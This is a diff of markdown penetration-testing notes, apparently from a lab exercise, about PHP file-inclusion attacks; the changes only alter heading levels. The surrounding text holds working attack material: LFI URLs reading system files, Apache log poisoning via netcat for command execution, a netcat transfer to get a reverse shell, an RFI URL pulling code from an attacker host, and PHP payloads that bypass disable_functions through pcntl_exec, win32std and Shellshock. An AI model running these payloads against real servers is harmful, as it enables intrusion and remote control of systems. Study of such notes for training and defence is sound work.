@@ -14,12 +14,12 @@ include( $lang . '.php' );
 ```
 Because the LANG field can be controlled, the attacker can put in the path to a local or remote file.
 
-## 1. Local file inclusion (LFI)
-### a. Reading arbitrary files
+# 1. Local file inclusion (LFI)
+# a. Reading arbitrary files
 Windows hosts file:
 `http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00&name=test&comment=test`
 
-### b. Contaminating apache log file and executing it
+# b. Contaminating apache log file and executing it
 Use netcat to connect to the server and contaminate `C:/xampp/apache/logs/access.log` file:
 ```
 root@kali:~# nc -v 10.11.23.188 80
@@ -35,7 +35,7 @@ After contamination, the access.log file on the serve is like this:
 Display the access.log file to execute the command:
 `http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test`
 
-### c. Transferring netcat and obtaining reverse shell
+# c. Transferring netcat and obtaining reverse shell
 Kali:
 ```
 mkdir /tftp 
@@ -59,7 +59,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 is used to get the TTY shell
 
-## 2. Remote file inclusion (RFI)
+# 2. Remote file inclusion (RFI)
 Executing a command via a remote php page:
 http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00&name=test&comment=test
 
@@ -72,9 +72,9 @@ Most modern php configuration disallows remote file includes of http URIs. For e
 allow_url_fopen = Off
 allow_url_include = Off
 ```
-## 3. Bypass PHP disable_functions
+# 3. Bypass PHP disable_functions
 The server admin can disable PHP command execution to enhance the security. In that case, we have to bypass it so that our LFI/RFI attack is meaningful.
-### Use PHP code to download file and list directory
+## a. Use PHP code to download file and list directory
 ```php
 function listDir($dir) {
     if ($handle = opendir($dir)) {
@@ -99,7 +99,7 @@ function downloadFile($url, $path) {
     }
 }
 ```
-### PHP 4.2.0+, PHP 5: pcntl_exec
+## b. PHP 4.2.0+, PHP 5: pcntl_exec
 ```php
 <?php
 $cmd = @$_REQUEST[cmd];
@@ -111,7 +111,7 @@ pcntl_exec("/bin/bash", $cmd);
 echo file_get_contents("out");        
 ?>
 ```
-### PHP 5.2.3: Win32std ext Protections Bypass
+## c. PHP 5.2.3: Win32std ext Protections Bypass
 ```php
 <?php
 if (!extension_loaded("win32std")) die("win32std extension required!");
@@ -119,7 +119,7 @@ system("cmd.exe"); //just to be sure that protections work well
 win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");
 ?>
 ```
-### PHP 5.x: Shellshock
+## d. PHP 5.x: Shellshock
 ```php
 <?php
 function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
@@ -136,7 +136,7 @@ function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
 }
 ?>
 ```
-## 4. Deal with missing -e option in netcat
+# 4. Deal with missing -e option in netcat
 Certain nc version does not provide -e option for us to open a shell session. Workaround by using `/bin/sh` as below:
 ```php
 <?php
